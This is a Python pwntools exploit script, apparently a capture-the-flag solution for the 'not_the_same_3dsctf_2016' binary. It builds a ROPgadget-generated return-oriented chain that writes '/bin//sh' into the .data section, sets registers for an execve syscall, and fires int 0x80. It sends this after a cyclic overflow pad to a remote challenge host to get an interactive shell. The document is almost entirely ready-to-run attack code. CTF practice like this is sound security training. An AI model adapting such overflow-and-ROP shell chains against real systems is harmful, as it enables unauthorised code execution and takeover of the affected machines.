from pwn import *
from struct import pack

# Padding goes here
p = b""

p += pack("<I", 0x0806FCCA)  # pop edx ; ret
p += pack("<I", 0x080EB060)  # @ .data
p += pack("<I", 0x08048B0B)  # pop eax ; ret
p += b"/bin"
p += pack("<I", 0x0805586B)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x0806FCCA)  # pop edx ; ret
p += pack("<I", 0x080EB064)  # @ .data + 4
p += pack("<I", 0x08048B0B)  # pop eax ; ret
p += b"//sh"
p += pack("<I", 0x0805586B)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x0806FCCA)  # pop edx ; ret
p += pack("<I", 0x080EB068)  # @ .data + 8
p += pack("<I", 0x08049423)  # xor eax, eax ; ret
p += pack("<I", 0x0805586B)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080481AD)  # pop ebx ; ret
p += pack("<I", 0x080EB060)  # @ .data
p += pack("<I", 0x0806FCF1)  # pop ecx ; pop ebx ; ret
p += pack("<I", 0x080EB068)  # @ .data + 8
p += pack("<I", 0x080EB060)  # padding without overwrite ebx
p += pack("<I", 0x0806FCCA)  # pop edx ; ret
p += pack("<I", 0x080EB068)  # @ .data + 8
p += pack("<I", 0x08049423)  # xor eax, eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0807B2AF)  # inc eax ; ret
p += pack("<I", 0x0806D8A5)  # int 0x80

# Generated by `ROPgadget --binary not_the_same_3dsctf_2016 --badbytes 0a --ropchain`

# exe = ELF("./not_the_same_3dsctf_2016")
# r = exe.process()
r = remote("node4.buuoj.cn", 29214)

r.sendline(cyclic(0x2D) + p)
r.interactive()
